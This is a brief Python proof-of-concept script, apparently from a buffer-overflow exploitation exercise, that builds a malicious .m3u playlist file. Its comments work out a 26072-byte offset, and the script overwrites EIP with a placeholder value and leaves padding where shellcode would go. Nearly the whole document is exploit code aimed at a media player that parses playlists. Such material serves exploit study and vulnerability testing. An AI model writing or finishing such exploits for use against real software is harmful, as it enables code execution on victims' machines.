# Pattern create has issue when generating more than 20280 bytes and above
# Manual calculation is required here
# Cyclic calculation only found 5792 bytes
# It is required to add 20280 bytes with 5792 bytes
# Actual buffer is 26072 bytes

import struct 

buf = "A" * 26072                       # actual buffer size 
buf += struct.pack("<L", 0x42424242)    # overwrite EIP
buf += "C" * (30000 - 26072 - 4)        # deductions of remaining buffer for shellcoding

payload = buf

f = open('poc.m3u','w')
f.write(payload)
f.close()
